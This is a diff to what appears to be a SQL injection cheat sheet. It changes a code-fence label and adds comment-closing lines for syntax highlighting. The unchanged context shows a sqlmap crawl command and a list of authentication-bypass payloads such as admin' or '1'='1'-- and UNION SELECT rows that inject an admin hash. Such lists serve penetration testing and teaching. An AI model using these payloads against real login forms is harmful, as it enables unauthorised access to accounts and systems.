@@ -20,7 +20,7 @@ sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threa
 ```
 
 # Authentication Bypass Cheatsheet
-```shell
+```sql
 '-'
 ' '
 '&'
@@ -80,11 +80,13 @@ admin' or '1'='1
 admin' or '1'='1'--
 admin' or '1'='1'#
 admin' or '1'='1'/*
+*/ -- Close to fix syntax highlighting
 admin'or 1=1 or ''='
 admin' or 1=1
 admin' or 1=1--
 admin' or 1=1#
 admin' or 1=1/*
+*/ -- Close to fix syntax highlighting
 admin') or ('1'='1
 admin') or ('1'='1'--
 admin') or ('1'='1'#
@@ -93,6 +95,7 @@ admin') or '1'='1
 admin') or '1'='1'--
 admin') or '1'='1'#
 admin') or '1'='1'/*
+*/ -- Close to fix syntax highlighting
 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
 admin" --
 admin';-- azer 
@@ -102,11 +105,13 @@ admin" or "1"="1
 admin" or "1"="1"--
 admin" or "1"="1"#
 admin" or "1"="1"/*
+*/ -- Close to fix syntax highlighting
 admin"or 1=1 or ""="
 admin" or 1=1
 admin" or 1=1--
 admin" or 1=1#
 admin" or 1=1/*
+*/ -- Close to fix syntax highlighting
 admin") or ("1"="1
 admin") or ("1"="1"--
 admin") or ("1"="1"#
@@ -115,5 +120,6 @@ admin") or "1"="1
 admin") or "1"="1"--
 admin") or "1"="1"#
 admin") or "1"="1"/*
+*/ -- Close to fix syntax highlighting
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
